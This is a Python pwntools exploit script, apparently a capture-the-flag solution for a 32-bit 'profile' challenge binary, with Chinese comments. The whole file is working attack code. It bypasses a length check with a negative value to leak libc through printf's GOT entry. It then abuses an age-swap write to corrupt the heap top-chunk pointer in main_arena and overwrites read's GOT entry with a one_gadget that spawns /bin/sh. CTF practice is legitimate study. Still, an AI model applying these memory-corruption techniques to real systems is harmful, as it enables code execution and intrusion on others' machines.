from pwn import *
import binascii
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/pwn400/profile'

def create_profile(name_len, name, age):
    io.recvuntil('>')
    io.sendline('1')
    io.recvuntil('Input your name len:\n')
    io.sendline(name_len)
    io.recvuntil('Input your name:\n')
    io.sendline(name)
    io.recvuntil('Input your age:\n')
    io.sendline(age)

def update_profile(name_len, name, age):
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('Input your new namelen:\n')
    io.sendline(name_len)
    io.recvuntil('Input your name:\n')
    io.sendline(name)
    io.recvuntil('Input your age:\n')
    io.sendline(age)

def print_profile():
    io.recvuntil(">")
    io.sendline('2')
    return io.recv().splitlines()[0][11:15][::-1]

def exchange_age(address1, address2):
    io.sendline('4')
    io.recvuntil('Person 1:')
    io.send(p32(address1))
    io.recvuntil('Person 2:')
    io.send(p32(address2))

MAGIC_addr = 0x5fbc6
# one_gadget /lib/i386-linux-gnu/libc.so.6 
# 0x5fbc6	execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

main_arena_addr = 0x001B2780 # /lib/i386-linux-gnu/libc.so.6 malloc_trim() v24 = &main_arena;

elf = ELF(path)
printf_got_addr = elf.got['printf']
read_got_addr = elf.got['read']

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
printf_offset = libc.symbols['printf']

io = process(path)

# 泄露libc基地址
create_profile('10', 'a' * 10, '1')

payload = p32(printf_got_addr)
update_profile('-10', payload, '1') # 用负数绕过长度检查
printf_addr = print_profile()
libc_base = int(binascii.b2a_hex(printf_addr), 16) - printf_offset

MAGIC_addr = libc_base + MAGIC_addr
top_chunk_addr = libc_base + main_arena_addr + 0x30
# p main_arena
# $1 = {
#   mutex = 0x0, 
#   flags = 0x0, 
#   fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
#   top = 0x0, 
#   last_remainder = 0x0, 
#   bins = {0x0 <repeats 254 times>}, 
#   binmap = {0x0, 0x0, 0x0, 0x0}, 
#   next = 0xf7fb4780 <main_arena>, 
#   next_free = 0x0, 
#   attached_threads = 0x1, 
#   system_mem = 0x0, 
#   max_system_mem = 0x0
# }

# gdb.attach(io, 'b *0x8048aef')
# print hex(top_chunk_addr) # 0xf7f797b0
# print hex(read_got_addr) # 0x804b00c

exchange_age(top_chunk_addr - 0xc, read_got_addr - 0x10)
# *top_chunk_addr = read_got_addr - 0x10;

update_profile('20', 'a' * 8 + p32(MAGIC_addr), '20')
# malloc(20) -> 8 + 20 -> *top_chunk_addr + 8 -> read_got_addr - 0x10 + 8 = 0x804b004
# *(0x804b004 + 8) = MAGIC_addr -> *(read_got_addr) = MAGIC_addr

io.interactive()
io.close()

# b *0x080488D1 updateProfile()